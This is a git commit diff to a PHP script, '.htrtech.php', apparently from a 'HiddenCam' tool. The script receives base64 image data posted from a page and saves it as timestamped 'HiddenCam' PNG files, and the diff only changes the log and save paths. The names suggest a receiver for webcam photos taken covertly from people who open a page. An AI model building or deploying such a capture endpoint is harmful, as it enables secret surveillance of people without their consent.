09e38f2a9f8c75ed2bc5440fa7dba17b1f2b47ca
Tahmid Rayat <56682134+htr-tech@users.noreply.github.com>
2020-02-16 12:58:35 +0600

    Update .htrtech.php

--- a/.www/.htrtech.php
+++ a/.www/.htrtech.php
@@ -4,13 +4,13 @@ $date = date('i_s_H-dMY');
 $imageData=$_POST['cat'];
 
 if (!empty($_POST['cat'])) {
-error_log("Received" . "\r\n", 3, ".cam.log");
+error_log("Received" . "\r\n", 3, ".www/.cam.log");
 
 }
 
 $filteredData=substr($imageData, strpos($imageData, ",")+1);
 $unencodedData=base64_decode($filteredData);
-$fp = fopen( 'HiddenCam-'.$date.'.png', 'wb' );
+$fp = fopen( '~/hiddencam/images/HiddenCam-'.$date.'.png', 'wb' );
 fwrite( $fp, $unencodedData);
 fclose( $fp );
 
